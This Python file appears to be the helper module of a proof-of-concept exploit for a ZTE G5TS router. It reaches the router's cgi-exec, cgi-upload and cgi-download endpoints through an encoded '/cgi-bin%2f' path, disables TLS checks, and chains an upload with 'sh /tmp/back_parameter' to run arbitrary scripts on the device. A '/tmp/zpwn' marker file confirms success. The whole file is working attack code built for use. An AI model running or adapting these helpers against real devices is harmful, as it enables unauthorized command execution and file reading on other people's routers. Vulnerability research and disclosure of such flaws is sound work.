"""cgi-io helpers for the ZTE G5TS PoC.

Wraps the three primitives reachable at /cgi-bin%2f:
  ex()  -> cgi-exec     (execv, no shell, runs as nobody)
  up()  -> cgi-upload   (writes /tmp/back_parameter)
  dl()  -> cgi-download (reads a world-readable file)
and shrun() = upload a script + run it with `sh` as nobody.

Configure the router via G5TS_HOST (default 192.168.0.1); the session comes from
rl.SESS. No secrets are stored here.
"""
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request

import rl

ctx = ssl._create_unverified_context()
ROUTER = rl.HOST
B = "https://" + ROUTER


def u(obj, meth, args, to=20):
    """ubus JSON-RPC call with the live session."""
    return rl.raw(rl.SESS, obj, meth, args, timeout=to)


def ex(cmd, to=20, tries=3):
    """cgi-exec: execv-style, space-separated argv, no shell."""
    err = "ERR"
    for _ in range(tries):
        body = urllib.parse.urlencode({"sessionid": rl.SESS, "command": cmd, "stderr": "1"}).encode()
        req = urllib.request.Request(B + "/cgi-bin%2fcgi-exec", data=body,
                                     headers={"Referer": B + "/",
                                              "Content-Type": "application/x-www-form-urlencoded"},
                                     method="POST")
        try:
            return urllib.request.urlopen(req, context=ctx, timeout=to).read(8000).decode("utf-8", "replace")
        except Exception as e:  # noqa: BLE001
            err = "ERR %s" % e
            time.sleep(1)
    return err


def dl(path, to=25):
    """cgi-download: read a world-readable file."""
    body = urllib.parse.urlencode({"sessionid": rl.SESS, "path": path}).encode()
    req = urllib.request.Request(B + "/cgi-bin%2fcgi-download", data=body,
                                 headers={"Referer": B + "/",
                                          "Content-Type": "application/x-www-form-urlencoded"},
                                 method="POST")
    try:
        return urllib.request.urlopen(req, context=ctx, timeout=to).read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return "HTTP %d" % e.code
    except Exception as e:  # noqa: BLE001
        return "ERR %s" % e


def up(target, data, field="filename"):
    """cgi-upload: write bytes; cgi-io stores them at /tmp/back_parameter."""
    bnd = "----probe" + rl.SESS[:8]
    parts = b""
    parts += ('--%s\r\nContent-Disposition: form-data; name="sessionid"\r\n\r\n%s\r\n' % (bnd, rl.SESS)).encode()
    parts += ('--%s\r\nContent-Disposition: form-data; name="%s"\r\n\r\n%s\r\n' % (bnd, field, target)).encode()
    parts += ('--%s\r\nContent-Disposition: form-data; name="filedata"; filename="f"\r\n'
              'Content-Type: application/octet-stream\r\n\r\n' % bnd).encode()
    parts += data + ('\r\n--%s--\r\n' % bnd).encode()
    req = urllib.request.Request(B + "/cgi-bin%2fcgi-upload", data=parts,
                                 headers={"Referer": B + "/",
                                          "Content-Type": "multipart/form-data; boundary=" + bnd},
                                 method="POST")
    try:
        r = urllib.request.urlopen(req, context=ctx, timeout=20)
        return r.status, r.read(200).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(200).decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return "ERR", str(e)[:80]


def shrun(script, ret=False):
    """Upload a script to /tmp/back_parameter and run it as nobody; return output."""
    if isinstance(script, str):
        script = script.encode()
    st = up("/tmp/back_parameter", script)
    out = ex("sh /tmp/back_parameter")
    return (st, out) if ret else out


def mark(path="/tmp/zpwn"):
    o = dl(path)
    return None if ("ERR" in o or "HTTP" in o or "DOCTYPE" in o) else o
